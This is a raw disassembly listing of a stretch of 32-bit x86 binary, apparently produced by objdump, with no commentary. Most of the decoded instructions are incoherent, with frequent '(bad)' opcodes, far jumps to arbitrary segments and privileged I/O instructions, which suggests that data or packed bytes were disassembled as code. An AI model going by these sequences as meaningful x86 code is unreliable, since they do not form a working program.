  4246ff:	adc    ebx,ecx
  424701:	or     al,0x5f
  424703:	jno    0x42471c
  424705:	mov    bl,cl
  424707:	xor    al,0x78
  424709:	(bad)  
  42470a:	fild   QWORD PTR [esi-0x4d]
  42470d:	retf   0x2c6f
  424710:	mov    bl,0x55
  424712:	adc    ch,cl
  424714:	test   eax,0x89f80cd
  424719:	call   0xe0c49aad
  42471e:	push   ds
  42471f:	mov    esp,0x31bd2ed5
  424724:	int    0x9e
  424726:	jnp    0x424796
  424728:	mov    eax,eax
  42472a:	push   eax
  42472b:	ss push eax
  42472d:	jmp    0xae5d:0x5c0bda7a
  424734:	cmp    al,0x78
  424736:	xchg   DWORD PTR [esi+0x1c3ddb32],ebx
  42473c:	int3   
  42473d:	xor    al,0xfa
  42473f:	adc    eax,0x21d6a8ef
  424744:	jp     0x42476d
  424746:	into   
  424747:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424748:	mov    ecx,0xe7925f91
  42474d:	pop    edi
  42474e:	rdpmc  
  424750:	ins    BYTE PTR es:[edi],dx
  424751:	inc    edi
  424752:	pop    eax
  424753:	fidiv  DWORD PTR [edx+0x41]
  424756:	push   edi
  424757:	(bad)  
  424758:	pop    ecx
  424759:	pop    edi
  42475a:	push   esp
  42475b:	fisub  WORD PTR [edi+0x56]
  42475e:	scas   al,BYTE PTR es:[edi]
  42475f:	loop   0x42473e
  424761:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424763:	pop    esi
  424764:	or     al,0x7a
  424766:	dec    ebx
  424767:	adc    al,0xad
  424769:	mov    edi,0xdb688495
  42476e:	dec    esp
  42476f:	xchg   edx,eax
  424770:	mov    edx,esp
  424772:	aam    0x62
  424774:	push   edx
  424775:	je     0x4247e2
  424777:	adc    eax,0xe296865
  42477c:	ja     0x42479f
  42477e:	push   0xffffff84
  424780:	cld    
  424781:	hlt    
  424782:	rcl    edx,cl
  424784:	or     al,0x21
  424786:	inc    ecx
  424787:	mov    bh,0xa
  424789:	repnz loope 0x424742
  42478c:	call   0x1f35:0x74b5dc68
  424793:	add    BYTE PTR [ebp-0x2],cl
  424796:	cmp    bh,ah
  424798:	or     eax,0x8a5447a5
  42479d:	pushf  
  42479e:	test   al,0x50
  4247a0:	jb     0x424768
  4247a2:	or     DWORD PTR [edi-0x1faa0f64],0x50
  4247a9:	sub    al,0xe9
  4247ab:	jae    0x42479d
  4247ad:	add    edx,esi
  4247af:	shr    DWORD PTR [eax+0x2bfd25aa],1
  4247b5:	sti    
  4247b6:	jnp    0x424752
  4247b8:	inc    ebp
  4247b9:	jnp    0x4247fd
  4247bb:	enter  0x8344,0x23
  4247bf:	retf   
  4247c0:	or     bh,dl
  4247c2:	and    al,BYTE PTR [eax+0x420317f8]
  4247c8:	stos   BYTE PTR es:[edi],al
  4247c9:	sub    BYTE PTR [edi-0x6679a50b],bh
	...
  4247d7:	add    BYTE PTR [eax],al
  4247d9:	add    BYTE PTR [edi+edi*4+0x63],bl
  4247dd:	push   eax
  4247de:	jecxz  0x4247bc
  4247e0:	jg     0x4247a1
  4247e2:	data16 adc al,0x63
  4247e5:	sbb    al,0xcb
  4247e7:	sahf   
  4247e8:	(bad)  
  4247e9:	out    dx,eax
  4247ea:	stos   DWORD PTR es:[edi],eax
  4247eb:	rol    BYTE PTR [ecx],0x0
  4247ee:	std    
  4247ef:	add    DWORD PTR [eax],eax
  4247f1:	add    bl,ch
  4247f3:	mov    DWORD PTR [ebp+0x7aeb04a1],0xd668b924
  4247fd:	push   cs
  4247fe:	jmp    0xb3c2:0x1badc81e
  424805:	arpl   WORD PTR [edx+0x23],dx
  424808:	aaa    
  424809:	ja     0x424872
  42480b:	xchg   edi,eax
  42480c:	add    al,0xf0
  42480e:	cmp    al,0xe6
  424810:	jecxz  0x4247c9
  424812:	push   edx
  424813:	mov    ds:0x90b042a7,al
  424818:	sbb    ecx,ebp
  42481a:	mov    ds:0x31dab5a1,eax
  42481f:	xchg   edi,eax
  424820:	ja     0x424829
  424822:	xchg   ecx,eax
  424823:	and    BYTE PTR [esp+ebp*2-0x48b2445],0x1e
  42482b:	mov    edi,0x8208bec8
  424830:	ds call 0xbe73:0xab22028f
  424838:	je     0x4248a0
  42483a:	adc    BYTE PTR [eax+0x5e7f72d7],ah
  424840:	ror    edi,1
  424842:	xor    edx,DWORD PTR [edx]
  424844:	gs cmc 
  424846:	ds sub bl,0x4a
  42484a:	xor    ecx,DWORD PTR [ecx+edx*4-0x77]
  42484e:	fisub  WORD PTR [ecx+0x46]
  424851:	cmp    cl,ah
  424853:	sbb    al,0xbc
  424855:	inc    eax
  424856:	cmp    BYTE PTR [bp+si+0x795d],dl
  42485b:	push   esp
  42485c:	xlat   BYTE PTR ds:[ebx]
  42485d:	inc    esp
  42485e:	sar    edx,0xe4
  424861:	ret    
  424862:	inc    esi
  424863:	lahf   
  424864:	sti    
  424865:	outs   dx,DWORD PTR ds:[esi]
  424866:	lods   al,BYTE PTR ds:[esi]
  424867:	fisub  DWORD PTR [edi]
  424869:	cmp    edi,ebx
  42486b:	loop   0x4248c8
  42486d:	rcr    bh,1
  42486f:	in     al,dx
  424870:	hlt    
  424871:	fidiv  DWORD PTR [esi+0x43]
  424874:	jbe    0x42482c
  424876:	call   0xdc5f48a6
  42487b:	hlt    
  42487c:	inc    ecx
  42487d:	dec    ebp
  42487e:	inc    ebx
  42487f:	or     eax,0x744d2efc
  424884:	repz lahf 
  424886:	sub    ebp,DWORD PTR [ecx-0x73314ccb]
  42488c:	xchg   ecx,eax
  42488d:	cmp    edi,DWORD PTR [ebp-0x52]
  424890:	nop
  424891:	inc    esi
  424892:	enter  0xcf91,0x13
  424896:	(bad)  
  424897:	cdq    
  424898:	fwait
  424899:	out    0xf0,eax
  42489b:	push   ecx
  42489c:	jmp    0x4248e5
  42489e:	lock mov BYTE PTR [ecx+0x2f],bh
  4248a2:	mov    BYTE PTR [eax],al
  4248a4:	(bad)  
  4248a5:	push   esp
  4248a6:	inc    ebx
  4248a7:	stos   DWORD PTR es:[edi],eax
  4248a8:	fnsave [edi+ebp*1+0x3d]
  4248ac:	mov    eax,0xa9888a06
  4248b1:	popa   
  4248b2:	aam    0xcb
  4248b4:	sub    edx,DWORD PTR [esi]
  4248b6:	adc    ebp,DWORD PTR [ebp-0x71]
  4248b9:	sub    bl,BYTE PTR [esi]
  4248bb:	cmp    DWORD PTR [eax-0x56645aba],0xffffff86
  4248c2:	out    dx,eax
  4248c3:	adc    al,0xef
  4248c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4248c7:	xor    eax,0xbbba1194
  4248cc:	call   0xc990:0xaad6ff4c
  4248d3:	push   ebx
  4248d4:	sub    al,0xa
  4248d6:	mov    ecx,0x8dcfdd89
  4248db:	addr16 gs push edx
  4248de:	push   esi
  4248df:	lods   eax,DWORD PTR ds:[esi]
  4248e0:	and    DWORD PTR [esi],ebp
  4248e2:	mov    WORD PTR [ecx+0x71cf1da2],fs
  4248e8:	repnz sbb DWORD PTR [ebx+0x3f],edx
  4248ec:	push   esp
  4248ed:	mov    esp,0xa8dad0ef
  4248f2:	imul   edx,ebx,0x3bb4b856
  4248f8:	in     al,dx
  4248f9:	outs   dx,BYTE PTR ds:[esi]
  4248fa:	imul   esp,DWORD PTR [ecx],0x15
  4248fd:	pop    esp
  4248fe:	fst    QWORD PTR [ebx+ecx*1+0x7e]
  424902:	sete   BYTE PTR [edx-0x57b77264]
  424909:	pusha  
  42490a:	cli    
  42490b:	cmp    DWORD PTR [ebp+0x1f],esp
  42490e:	shl    BYTE PTR [esi+0x5b54d1a8],0x87
  424915:	fwait
  424916:	cwde   
  424917:	xor    ebp,ecx
  424919:	stos   BYTE PTR es:[edi],al
  42491a:	inc    eax
  42491b:	ins    BYTE PTR es:[edi],dx
  42491c:	retf   0xf18
  42491f:	sbb    al,BYTE PTR [ecx-0x70846d29]
  424925:	(bad)  
  424926:	mov    WORD PTR [ebx],ss
  424928:	lock lods al,BYTE PTR ds:[esi]
  42492a:	pop    eax
  42492b:	fwait
  42492c:	loopne 0x424982
  42492e:	push   0xa200751f
  424933:	dec    edx
  424934:	test   BYTE PTR [edi-0x3b822474],0x2d
  42493b:	push   ds
  42493c:	inc    esp
  42493d:	mov    ch,0x9a
  42493f:	(bad)  
  424940:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424941:	out    dx,al
  424942:	sbb    BYTE PTR [edx+ebp*4],0x81
  424946:	and    eax,0x7b56c51e
  42494b:	in     eax,0x87
  42494d:	jg     0x424935
  42494f:	cmp    al,0x85
  424951:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424952:	inc    ecx
  424953:	arpl   WORD PTR [ebx],bp
  424955:	fs cmc 
  424957:	mov    cl,0x69
  424959:	aas    
  42495a:	ror    DWORD PTR [eax-0x5c516352],0x90
  424961:	pop    edx
  424962:	xchg   esi,eax
  424963:	push   cs
  424964:	call   0x281a:0x6fc2fe12
  42496b:	std    
  42496c:	sbb    ch,BYTE PTR [edx]
  42496e:	xchg   ebx,eax
  42496f:	push   0x92d19114
  424974:	xchg   edi,eax
  424975:	jnp    0x42493c
  424977:	out    0x5e,eax
  424979:	scas   eax,DWORD PTR es:[edi]
  42497a:	fadd   DWORD PTR [ebp+0x74e300d0]
  424980:	pusha  
  424981:	xor    esi,edi
  424983:	xchg   edi,eax
  424984:	cmp    eax,0xe2dbabb3
  424989:	adc    DWORD PTR [edx],edx
  42498b:	das    
  42498c:	fisttp WORD PTR ds:[ebp-0x4a]
  424990:	fimul  WORD PTR [esi-0x2ed93f02]
  424996:	les    ebx,FWORD PTR [ebx]
  424998:	sub    ebx,ecx
  42499a:	nop
  42499b:	jmp    0x424a1c
  42499d:	push   ss
  42499e:	xchg   edi,eax
  42499f:	repnz or ah,BYTE PTR [ecx]
  4249a2:	pop    es
  4249a3:	js     0x42493a
  4249a5:	jp     0x4249ee
  4249a7:	cmp    dl,BYTE PTR [esi+0x29e76b0b]
  4249ad:	stc    
  4249ae:	or     eax,DWORD PTR [esi-0x59]
  4249b1:	push   cs
  4249b2:	jg     0x424982
  4249b4:	clc    
  4249b5:	in     eax,0xa0
  4249b7:	shl    ch,cl
  4249b9:	outs   dx,BYTE PTR ds:[esi]
  4249ba:	in     eax,0xb9
  4249bc:	retf   0xcfe2
  4249bf:	js     0x424986
  4249c1:	lock jne 0x4249cd
  4249c4:	and    al,0x88
  4249c6:	xchg   ebp,eax
  4249c7:	nop
  4249c8:	mov    ah,0x7a
  4249ca:	lock pop eax
  4249cc:	ror    edx,cl
  4249ce:	(bad)  
  4249cf:	pop    esi
  4249d0:	loopne 0x424a39
  4249d2:	pop    es
  4249d3:	das    
  4249d4:	out    0xe8,eax
  4249d6:	out    0x27,eax
  4249d8:	xor    eax,0xe7ee420d
  4249dd:	out    0x83,eax
  4249df:	push   es
  4249e0:	and    DWORD PTR [eax],0x9971b258
  4249e6:	in     al,dx
  4249e7:	popf   
  4249e8:	add    esi,DWORD PTR ds:0xd8c57d22
  4249ee:	push   0x0
  4249f3:	add    BYTE PTR [eax],al
  4249f5:	add    BYTE PTR [eax],al
  4249f7:	add    BYTE PTR [eax],al
  4249f9:	add    BYTE PTR [ebx+0x55],al
  4249fc:	pusha  
  4249fd:	(bad)  
  4249fe:	jbe    0x4249bf
  424a00:	out    dx,eax
  424a01:	(bad)  
  424a03:	test   al,0x37
  424a05:	stos   DWORD PTR es:[edi],eax
  424a06:	xor    cl,dl
  424a08:	stos   BYTE PTR es:[edi],al
  424a09:	loopne 0x4249b3
  424a0b:	ret    0x1
  424a0e:	std    
  424a0f:	add    DWORD PTR [eax],eax
  424a11:	add    ch,al
  424a13:	ds jg  0x424a7f
  424a16:	push   ss
  424a17:	mov    bh,0xf7
  424a19:	xchg   ebx,eax
  424a1a:	fadd   st,st(0)
  424a1c:	sbb    eax,0x33dc2fc4
  424a21:	es dec ecx
  424a23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a24:	push   es
  424a25:	adc    eax,0x83fe8ab2
  424a2a:	pusha  
  424a2b:	inc    ebx
  424a2c:	loop   0x424a36
  424a2e:	cmp    BYTE PTR [ebx],dh
  424a30:	fs jmp 0x95c8:0x3d142d9c
  424a38:	mov    eax,0x3a339dec
  424a3d:	inc    ebx
  424a3e:	jo     0x4249c1
  424a40:	push   edi
  424a41:	jmp    0x424a82
  424a43:	scas   al,BYTE PTR es:[edi]
  424a44:	cld    
  424a45:	stc    
  424a46:	xchg   edx,eax
  424a47:	cmp    al,0x29
  424a49:	clc    
  424a4a:	aam    0x9e
  424a4c:	jp     0x4249e0
  424a4e:	cdq    
  424a4f:	pop    esp
  424a50:	push   ebp
  424a51:	push   ebx
  424a52:	dec    esp
  424a53:	in     eax,0x99
  424a55:	sbb    ch,BYTE PTR [edx]
  424a57:	push   esp
  424a58:	and    dl,al
  424a5a:	std    
  424a5b:	and    eax,DWORD PTR [ebx+0x31e33d02]
  424a61:	xlat   BYTE PTR ds:[ebx]
  424a62:	push   ss
  424a63:	push   edx
  424a64:	aad    0xd4
  424a66:	ret    0xa30d
  424a69:	lods   eax,DWORD PTR ds:[esi]
  424a6a:	add    ebx,ebp
  424a6c:	(bad)
  424a70:	mov    DWORD PTR [ecx+0x25226d0],ebx
  424a76:	sbb    dh,BYTE PTR [eax-0x35c1e41]
  424a7c:	pop    ss
  424a7d:	xor    bl,ah
  424a7f:	or     ch,BYTE PTR [edi+0x5d69c9dd]
  424a85:	fwait
  424a86:	push   ss
  424a87:	xlat   BYTE PTR ds:[ebx]
  424a88:	aas    
  424a89:	adc    BYTE PTR [edi-0x3a9d6cc1],al
  424a8f:	xchg   DWORD PTR [ecx+0x57],eax
  424a92:	sti    
  424a93:	xor    eax,0xb3ad7762
  424a98:	mov    ch,0x20
  424a9a:	clc    
  424a9b:	loopne 0x424a25
  424a9d:	xchg   DWORD PTR [bp+si],ebx
  424aa0:	in     eax,0x40
  424aa2:	add    DWORD PTR [ebx],esi
  424aa4:	dec    al
  424aa6:	xor    edi,esi
  424aa8:	cmp    edx,ebp
  424aaa:	adc    al,0x7b
  424aac:	lock pusha 
  424aae:	cvtdq2ps xmm4,xmm3
  424ab1:	shl    DWORD PTR [esi-0x89c8911],0xc1
  424ab8:	stos   DWORD PTR es:[edi],eax
  424ab9:	and    dl,BYTE PTR [esi]
  424abb:	aam    0x2f
  424abd:	es sub eax,0xb19bdd86
  424ac3:	push   eax
  424ac4:	std    
  424ac5:	adc    edx,DWORD PTR [ebx-0x45dfc430]
  424acb:	adc    al,0x27
  424acd:	aaa    
  424ace:	repnz lods eax,DWORD PTR ds:[esi]
  424ad0:	push   edi
  424ad1:	lods   eax,DWORD PTR ds:[esi]
  424ad2:	icebp  
  424ad3:	jp     0x424abf
  424ad5:	mov    eax,0xa37d1706
  424ada:	push   cs
  424adb:	sbb    DWORD PTR [edx+0x67d401d5],0x5
  424ae2:	xchg   edx,eax
  424ae3:	lea    esi,[ebx-0xc1a5030]
  424ae9:	sar    DWORD PTR ds:0xf73136d4,1
  424aef:	mov    eax,ds:0x240d1335
  424af4:	and    al,0x44
  424af6:	jp     0x424ac5
  424af8:	adc    esp,esp
  424afa:	dec    edx
  424afb:	push   edi
  424afc:	pop    ebx
  424afd:	bound  eax,QWORD PTR [ebx-0x24]
  424b00:	sbb    al,0xd6
  424b02:	jle    0x424a9d
  424b04:	and    bl,BYTE PTR [ecx-0x649c7cba]
  424b0a:	push   edi
  424b0b:	mov    ecx,0xe0862e67
  424b10:	fsubr  DWORD PTR [ebx]
  424b12:	xor    DWORD PTR [eax+eiz*2],ecx
  424b15:	jae    0x424af1
  424b17:	stos   DWORD PTR es:[edi],eax
  424b18:	jge    0x424b3d
  424b1a:	aam    0x62
  424b1c:	or     DWORD PTR [edx-0x7242d706],edi
  424b22:	shr    DWORD PTR [ebx-0x6c],0x63
  424b26:	pop    eax
  424b27:	cmp    BYTE PTR [edi+ebp*8+0x71],bh
  424b2b:	in     al,0x6e
  424b2d:	jb     0x424ad0
  424b2f:	adc    al,0x9e
  424b31:	add    BYTE PTR [edx],bl
  424b33:	mov    esp,0x2c52ed7d
  424b38:	adc    dh,BYTE PTR [edi]
  424b3a:	int    0xd8
  424b3c:	inc    edi
  424b3d:	std    
  424b3e:	pusha  
  424b3f:	cwde   
  424b40:	ret    
  424b41:	sar    DWORD PTR es:[edi+0xcd11ebb],0xf7
  424b49:	shr    DWORD PTR [ecx+0x17e484d3],cl
  424b4f:	mov    ecx,0x77925560
  424b54:	das    
  424b55:	pop    es
  424b56:	mov    ds:0xd09d5a75,eax
  424b5b:	iret   
  424b5c:	daa    
  424b5d:	push   cs
  424b5e:	out    0xd4,eax
  424b60:	dec    ebp
  424b61:	or     DWORD PTR [esi],0x25
  424b64:	push   esp
  424b65:	sysexit 
  424b67:	and    BYTE PTR [esi+edi*4-0x56],dh
  424b6b:	sub    al,0xce
  424b6d:	pop    ss
  424b6e:	sbb    DWORD PTR [ebx+0x5b],ecx
  424b71:	dec    ecx
  424b72:	add    eax,0x42edea85
  424b77:	inc    ebx
  424b78:	or     al,0xa8
  424b7a:	mov    esp,0x88a95b30
  424b7f:	hlt    
  424b80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424b81:	test   DWORD PTR [esi+0x3c5be29f],edx
  424b87:	out    0x82,al
  424b89:	je     0x424beb
  424b8b:	aas    
  424b8c:	pop    ecx
  424b8d:	sbb    dh,ch
  424b8f:	fsub   QWORD PTR [ebx]
  424b91:	mov    dl,BYTE PTR [eax-0x844c3e4]
  424b97:	sub    BYTE PTR [esi-0x11b98d35],cl
  424b9d:	inc    edi
  424b9e:	xor    dl,BYTE PTR [edx-0x58227b63]
  424ba4:	jg     0x424bbf
  424ba6:	push   cs
  424ba7:	xlat   BYTE PTR ds:[ebx]
  424ba8:	jl     0x424b3b
  424baa:	inc    edi
  424bab:	das    
  424bac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424bad:	push   ebp
  424bae:	imul   ecx,DWORD PTR [eax+0x7b],0xffffffc4
  424bb2:	les    ebx,FWORD PTR [esi]
  424bb4:	outs   dx,BYTE PTR ds:[esi]
  424bb5:	repnz and bh,ch
  424bb8:	outs   dx,DWORD PTR ds:[esi]
  424bb9:	xchg   esp,eax
  424bba:	pop    esp
  424bbb:	daa    
  424bbc:	test   eax,0xc202884f
  424bc1:	sub    DWORD PTR [ebx-0x39],eax
  424bc4:	dec    ecx
  424bc5:	xlat   BYTE PTR ds:[ebx]
  424bc6:	fstp   DWORD PTR [ebx+0x2dd4f062]
  424bcc:	cmp    ebx,DWORD PTR [ebp+0x3d596d3]
  424bd2:	push   0xf9b809fb
  424bd7:	mov    ds:0x6e43c2e4,eax
  424bdc:	lds    eax,FWORD PTR [eax+eiz*4+0x3c]
  424be0:	popa   
  424be1:	inc    ecx
  424be2:	test   eax,0x6d5faa59
  424be7:	push   es
  424be8:	mov    al,0x16
  424bea:	test   DWORD PTR [ecx-0x694aa73e],esi
  424bf0:	sub    eax,0x18bf34de
  424bf5:	stc    
  424bf6:	pushf  
  424bf7:	enter  0x34b5,0x9c
  424bfb:	ins    DWORD PTR es:[edi],dx
  424bfc:	cmp    DWORD PTR [esi],edi
  424bfe:	xlat   BYTE PTR ds:[ebx]
  424bff:	jl     0x424c3b
  424c01:	ror    BYTE PTR [edx+esi*2],cl
  424c04:	sbb    al,0x44
  424c06:	outs   dx,BYTE PTR ds:[esi]
  424c07:	out    0x80,eax
  424c09:	pop    edx
  424c0a:	pop    ecx
  424c0b:	jecxz  0x424c8b
  424c0d:	xchg   esp,eax
  424c0e:	sbb    eax,0x0
  424c13:	add    BYTE PTR [eax],al
  424c15:	add    BYTE PTR [eax],al
  424c17:	add    BYTE PTR [eax],al
  424c19:	add    BYTE PTR [edi+0x2d],dl
  424c1c:	pop    es
  424c1d:	call   0xe967:0xeddfba7f
  424c24:	addr16 xor al,0x17
  424c27:	out    0xff,eax
  424c29:	add    esp,DWORD PTR [ebp-0x2fffe3c]
  424c2f:	add    DWORD PTR [eax],eax
  424c31:	add    BYTE PTR [ebp+0x55b7c6b8],ch
  424c37:	scas   al,BYTE PTR es:[edi]
  424c38:	fld    DWORD PTR [ebx-0x15]
  424c3b:	adc    ch,BYTE PTR [edi]
  424c3d:	xchg   esp,eax
  424c3e:	mov    bh,0x89
  424c40:	sbb    cl,BYTE PTR [edi*4+0x66b1957a]
  424c47:	icebp  
  424c48:	xchg   ebx,eax
  424c49:	dec    ebx
  424c4a:	dec    edx
  424c4b:	mov    gs,WORD PTR es:[edx]
  424c4e:	int    0xe6
  424c50:	iret   
  424c51:	mov    ecx,0xb0108359
  424c56:	int3   
  424c57:	cmp    ah,ah
  424c59:	iret   
  424c5a:	pop    esi
  424c5b:	sbb    al,BYTE PTR [eax]
  424c5d:	sub    al,0x24
  424c5f:	(bad)  
  424c60:	fsub   QWORD PTR [ecx+0x4]
  424c63:	rcl    DWORD PTR [edx-0x58],1
  424c66:	push   cs
  424c67:	push   edx
  424c68:	(bad)  
  424c6a:	sbb    al,0x68
  424c6c:	xor    BYTE PTR [ecx],al
  424c6e:	mov    bh,0x95
  424c70:	ret    
  424c71:	adc    eax,0x893d50d0
  424c76:	data16 (bad) 
  424c79:	xchg   edx,eax
  424c7a:	pop    ebx
  424c7b:	inc    ecx
  424c7c:	xor    al,0x44
  424c7e:	mov    al,0xc0
  424c80:	push   ebp
  424c81:	xchg   ecx,eax
  424c82:	cmc    
  424c83:	jnp    0x424cb3
  424c85:	jbe    0x424c52
  424c87:	xor    bh,BYTE PTR [ebp+ecx*4+0x4c]
  424c8b:	mov    ds:0x5668f43e,al
  424c90:	div    DWORD PTR [edx+0x5ed05b66]
  424c96:	lahf   
  424c97:	mov    ch,0xb1
  424c99:	add    al,0xcb
  424c9b:	or     bh,al
  424c9d:	cli    
  424c9e:	(bad)  
  424c9f:	sar    DWORD PTR [esi-0x70],cl
  424ca2:	inc    eax
  424ca3:	les    esp,FWORD PTR [ebp-0x7b]
  424ca6:	enter  0x43,0xba
  424caa:	int    0x37
  424cac:	rol    dl,0x69
  424caf:	jmp    0x424c6b
  424cb1:	pop    es
  424cb2:	nop
  424cb3:	xor    ch,dh
  424cb5:	pop    eax
  424cb6:	mov    bh,bl
  424cb8:	jne    0x424ca8
  424cba:	inc    eax
  424cbb:	pop    es
  424cbc:	add    ebp,DWORD PTR [edx+0x633d245d]
  424cc2:	pop    esi
  424cc3:	pop    ss
  424cc4:	popf   
  424cc5:	adc    dl,BYTE PTR [esi+0x155d2d52]
  424ccb:	scas   eax,DWORD PTR es:[edi]
  424ccc:	(bad)
  424ccf:	stc    
  424cd0:	cwde   
  424cd1:	retf   0xa54c
  424cd4:	cmp    BYTE PTR [eax-0x3],al
  424cd7:	ret    
  424cd8:	(bad)  
  424cd9:	mov    al,ds:0x8317c207
  424cde:	in     eax,dx
  424cdf:	gs adc eax,0xb78e8d87
  424ce5:	push   ebx
  424ce6:	cmp    al,dl
  424ce8:	adc    cl,dh
  424cea:	cmp    al,0xa1
  424cec:	cwde   
  424ced:	and    bl,BYTE PTR [eax+0x704bad59]
  424cf3:	stc    
  424cf4:	repz out 0xf3,al
  424cf7:	pop    ebp
  424cf8:	pop    edx
  424cf9:	adc    eax,0x2b1573c7
  424cfe:	outs   dx,BYTE PTR ds:[esi]
  424cff:	mov    dl,0xf7
  424d01:	ret    
  424d02:	(bad)
  424d06:	push   ss
  424d07:	xchg   ecx,eax
  424d08:	test   eax,0x96a28e24
  424d0d:	ss push ebp
  424d0f:	xor    al,0x68
  424d11:	cmp    BYTE PTR [ecx+0x43],ah
  424d14:	sub    bl,cl
  424d16:	cmc    
  424d17:	add    al,0x3
  424d19:	iret   
  424d1a:	lds    esp,FWORD PTR [ecx+0x6a1c2ea]
  424d20:	ins    BYTE PTR es:[edi],dx
  424d21:	outs   dx,BYTE PTR ds:[esi]
  424d22:	retf   0xa7dd
  424d25:	or     BYTE PTR [ebx+ecx*2],al
  424d28:	mov    eax,ds:0x2e8d214e
  424d2d:	popf   
  424d2e:	xchg   ebp,eax
  424d2f:	icebp  
  424d30:	inc    edx
  424d31:	cli    
  424d32:	imul   eax,edx,0x17
  424d35:	shl    BYTE PTR [edi-0x30],cl
  424d38:	sub    dh,al
  424d3a:	sub    DWORD PTR [ebx-0x65d9c509],edi
  424d40:	mov    DWORD PTR ds:0xa3553a55,ebx
  424d46:	es loopne 0x424cff
  424d49:	cs aad 0x4
  424d4c:	sub    al,BYTE PTR [eax]
  424d4e:	sub    bh,BYTE PTR [esi]
  424d50:	adc    eax,0x1be4f8e4
  424d55:	inc    edx
  424d56:	or     eax,0x33d19d6b
  424d5b:	mov    esp,0x4bce1461
  424d60:	je     0x424d69
  424d62:	ins    BYTE PTR es:[edi],dx
  424d63:	stc    
  424d64:	xor    DWORD PTR [ebp+0x2246c097],ebp
  424d6a:	and    eax,0xac246ca6
  424d6f:	mov    bh,0x98
  424d71:	pop    esi
  424d72:	loop   0x424def
  424d74:	mov    ds:0x4ae1d386,eax
  424d79:	mov    esp,0xbb4c6e
  424d7e:	xor    al,0x32
  424d80:	icebp  
  424d81:	push   ecx
  424d82:	xor    bl,BYTE PTR [ecx+0x12]
  424d85:	xor    dl,BYTE PTR [edi+eiz*1-0x3c70c98c]
  424d8c:	aaa    
  424d8d:	add    ch,BYTE PTR [ebp+0x29bf285]
  424d93:	inc    edi
  424d94:	(bad)  
  424d95:	imul   esi,DWORD PTR [edx-0x4b7b3429],0xffffffeb
  424d9c:	push   esi
  424d9d:	mov    al,0xb4
  424d9f:	fcomip st,st(5)
  424da1:	jmp    0x424d26
  424da3:	stc    
  424da4:	aaa    
  424da5:	mov    cl,0x72
  424da7:	stc    
  424da8:	sbb    eax,0xb9c12b98
  424dad:	sbb    edi,DWORD PTR [eax-0x7c]
  424db0:	ins    BYTE PTR es:[edi],dx
  424db1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424db2:	hlt    
  424db3:	mov    eax,tr0
  424db6:	mov    gs,WORD PTR [edx+eax*8+0x225a0e26]
  424dbd:	mov    WORD PTR [ebx-0x7b232589],cs
  424dc3:	cmc    
  424dc4:	fisttp WORD PTR [ecx-0x23]
  424dc7:	xor    ebp,DWORD PTR [esi]
  424dc9:	aas    
  424dca:	dec    edx
  424dcb:	mov    ch,BYTE PTR [ebp-0x107c4c42]
  424dd1:	and    ch,BYTE PTR [ebx]
  424dd3:	ret    
  424dd4:	mov    ds:0xe61c393c,al
  424dd9:	popa   
  424dda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ddb:	jmp    0x424d94
  424ddd:	clc    
  424dde:	pop    ecx
  424ddf:	adc    BYTE PTR [edi],dh
  424de1:	mov    DWORD PTR [edx],eax
  424de3:	pop    edi
  424de4:	call   0xccac:0xc57bf7e2
  424deb:	arpl   WORD PTR [ecx],di
  424ded:	mov    al,0xab
  424def:	xchg   BYTE PTR [ebp+0x63],bl
  424df2:	pop    ss
  424df3:	and    eax,0x896a6d9d
  424df8:	popf   
  424df9:	mov    esi,DWORD PTR [ebx]
  424dfb:	call   0x612e:0x69bd4522
  424e02:	mov    es,WORD PTR ds:0xa281de7
  424e08:	imul   eax,DWORD PTR [ebx],0x2
  424e0b:	push   cs
  424e0c:	or     BYTE PTR [ebp+ebx*1-0x6d],cl
  424e10:	mov    eax,0x104d1417
  424e15:	mov    ds:0x21cfc76b,al
  424e1a:	sbb    DWORD PTR [eax],edx
  424e1c:	dec    esi
  424e1d:	mov    dh,0x70
  424e1f:	rcr    DWORD PTR [ebp-0x74b0e3af],cl
  424e25:	pop    es
  424e26:	fwait
  424e27:	leave  
  424e28:	imul   eax,DWORD PTR [esi],0x5f
  424e2b:	xchg   BYTE PTR [eax+0x5fca],ch
	...
  424e39:	add    BYTE PTR [edx+ebp*1+0x2b],ch
  424e3d:	outs   dx,DWORD PTR es:[esi]
  424e3f:	daa    
  424e40:	ins    DWORD PTR es:[edi],dx
  424e41:	push   0xffffffda
  424e43:	add    BYTE PTR [ecx],0x9d
  424e46:	mov    cl,0x1d
  424e48:	mov    ss,WORD PTR [ecx]
  424e4a:	mov    ds:0xfd0001c6,al
  424e4f:	add    DWORD PTR [eax],eax
  424e51:	add    BYTE PTR [edi+edi*8],ah
  424e54:	pop    edi
  424e55:	addr16 sti 
  424e57:	xor    bl,BYTE PTR [ebx-0x65]
  424e5a:	jle    0x424e92
  424e5c:	das    
  424e5d:	dec    eax
  424e5e:	cmp    edi,ecx
  424e60:	loop   0x424e57
  424e62:	in     al,dx
  424e63:	inc    edx
  424e64:	dec    esi
  424e65:	or     eax,0xa3f06d85
  424e6a:	imul   DWORD PTR [ecx+0x1a6604d7]
  424e70:	lods   al,BYTE PTR ds:[esi]
  424e71:	lea    edi,[esi+0x1de8b5b7]
  424e77:	pop    ds
  424e78:	lahf   
  424e79:	(bad)  
  424e7b:	ins    BYTE PTR es:[edi],dx
  424e7c:	jo     0x424e09
  424e7e:	inc    esi
  424e7f:	mov    ah,0x4
  424e81:	dec    eax
  424e82:	cmp    esp,DWORD PTR ds:0x5bb3b49d
  424e88:	mov    eax,es:0xe1aba3bd
  424e8e:	mov    al,0xa9
  424e90:	and    ebx,DWORD PTR [esi]
  424e92:	adc    edi,ebx
  424e94:	leave  
  424e95:	pop    ds
  424e96:	aas    
  424e97:	idiv   DWORD PTR [ecx]
  424e99:	cli    
  424e9a:	mov    edx,0x48deaf58
  424e9f:	(bad)  
  424ea0:	mov    esi,0x20ab51ae
  424ea5:	lods   eax,DWORD PTR ds:[esi]
  424ea6:	jae    0x424ebf
